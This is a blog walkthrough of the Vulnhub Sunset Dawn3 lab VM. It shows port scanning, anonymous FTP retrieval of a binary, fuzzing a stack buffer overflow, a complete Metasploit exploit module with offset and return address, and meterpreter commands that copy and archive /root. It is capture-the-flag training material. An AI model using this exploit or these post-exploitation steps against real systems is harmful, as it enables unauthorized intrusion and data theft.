Vulnhub - Sunset Dawn3 walkthrough

Mar 10 2021-03-10T13:38:00-06:00 by Matt M
6 min

Introduction

Vulnhub dawn2 is listed on Vulnhub’s site as beginner/intermediate. This shares a lot of similarities with Sunset Dawn2, only this is VM is a bit easier to pop. Skills you’ll need are as follows:

  • basic port reconnaissance
  • port mapping
  • basic binary analysis
  • custom Metasploit module development

Find the host on the network

I use a lab for running these VMs. The lab’s network uses DHCP. The DHCP server lists dawn3 as 192.168.111.35.

My typical first routine is to port scan the host I’m working with. Nmap is the tool for the job. I’ll start with a basic port scan of all 65535 ports.

1

$ nmap -v -p- 192.168.111.35

The -v and -p- mean effectively use verbose mode and scan all ports. We’ve already hit a small snag. Scanning all ports is taking a really long time. But I’ve found two ports open so far. Maybe that’s enough to pop this machine. Let’s assume it is and move along.

Port enumeration and recon

We found ports 2100 and 6812 open on dawn3. Connecting with netcat and viewing the banner indicates this is a FTP server. Since I’m on MacOS it’s trivially easy to connect to this host via ftp. I’ll do CMD+space and type in the following: Great, this shows me some login options. I’ve selected Guest as my user. This will attempt anonymous login to the ftp server. And it apparently works. Excellent! In the Mac Finder, under Locations I can now browse to the FTP server see what’s hosted there. I can see a single file there, dawn3.exe. Let’s grab that and perform some analysis. Using rabin2 from the radare2 software suite we get more details on this exe.

There’s a few things of note in this output. We’re working with a 32bit file and that it’s a PE executable, which means it is intended for Windows operating systems. We can also see there’s not canary, nx or pic stack protection features. So this should be a relatively easy program to exploit, as long as we can find a decent point to exploit it.

Exploit development

Let’s take that exe over to our windows host, run1 it and see what happens. Looks like it’s opening a socket connection. Which port is it listning on?

It’s listening on port 6812 which is the same as one of the ports we found on our vulnerable server. It’s a solid bet whatever exploit we build for this program will also work on the vulnerable system.

I’ll attach a debugger to this program, make a connection to port 6812 and see what happens. I’ll be using x32dbg to attach and debug on the Windows machine. Once I make a successful socket connection, I can continue testing the socket’s vulnerabilities with some simple fuzzing.

Expediting the process, I find that 550 capital As seems to be just the right amount of A2 characters to overwrite both EBP and EIP. from the command line on the attacking host I’m running

1

$ perl -e "print 'A'x550" | ncat -v 192.168.111.99 6812

Note the stack pointers EBP and EIP in the above image. This gives us a strong starting point. Metasploit has a few great tools we can use for further develop this exploit. First we’ll be using pattern_create.rb and then pattern_offset.rb.

We know that 550 A characters sufficiently overflows the stack. Let’s create a unique pattern and see where that gets us.

1

$ /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 550

Now I’ll take the output of that command and echo it into a netcat connection while I have dawn3.exe listening.

1

$ echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2A" | ncat -v 192.168.111.99 6812

Great, now take note of the EIP pointer. Instead of the typical 41414141 we now have 35724134. I’ll use that number to find exactly where in our string we’ve overflow EIP.

1

/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l 550 -q 35724134

And I have an exact match of offset 524. Next we need to find a place to put our shellcode. A really useful tool for this task is msfbinscan. Run that against the dawn3.exe program. We’re looking for JMP instructions.

And there it is, we have it at 0x52501513.

Last time on dawn2 we used the metasploit example template file. let’s use that same file, but we’ll make modifications for this specific binary. Our offset is 524 and our JMP is at 0x52501513.

require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
  super(update_info(info,
    'Name' => 'Buffer Overflow Example sunset dawn3 vulnhub',
    'Description' => %q{
      Application Exploitation Module sunset dawn3 vulnhub
    },
    'Platform' => 'Windows',
    'Author' =>
      [
        'stdout'
      ],

     'Payload' =>
      {
        'space' => 1000,
        'BadChars' => "\x20\x0a\x0d\x00\xff"
      },
     'Targets' =>
      [
        ['linux', {'Ret' => 0x52501513, 'Offset' => 524}]
      ],
     'DisclosureDate' => '2019-01-15'
  ))

  register_options(
  [
  ],self.class)
  end

  def exploit
    connect
    buf = rand_text_alpha_upper(target['Offset'])
    buf += [target['Ret']].pack('V') + make_nops(20) + payload.encoded + "\x00"
    sock.put(buf)
    handler
    disconnect
   end
end

Attacking the host service

Load that custom module into the metasploit framework and test it against the vulnerable binary running on our Windows host. Great, it worked. Now I’ll make the necessary changes to running module configuration to test it against our vulnerable VM host. And once again it works! The getuid command from the meterpreter shell says we’re running as root. But we can’t seem to ls or perform any operations on the /root directory. Hm.

After some poking and prodding around within the meterpreter shell I discovered that I could not drop to a shell, but I could write to and read from the /root home directory, as long as I knew what was there. For instance, I could touch a file and then copy that file out to /tmp. I could also echo a string into a file, copy that file out to /tmp and the read it as well. Keeping in mind my goal, I simply want to find the root flag.

Getting root

I ended up using the execute command to copy the entire /root folder to /tmp/root and then using the execute command within the meterpreter shell to tar up the entire /root folder, download it and read the flag.

1

meterpreter > execute -f /bin/cp -a '-r /root/* /tmp/root/'

1

meterpreter > execute -f /bin/tar -a '-cf root.tar /tmp/root'

and finally, we download that tar file using meterpreter’s built in download command, unpack the tar file and read root’s flag on our local filesystem!

  1. Never under any circumstances run any unknown executable on any computers that you care about. ↩

  2. In hex, ‘A’ translates to 41. 41 can be seen repeating in the overflown registers EBP and EIP. ↩
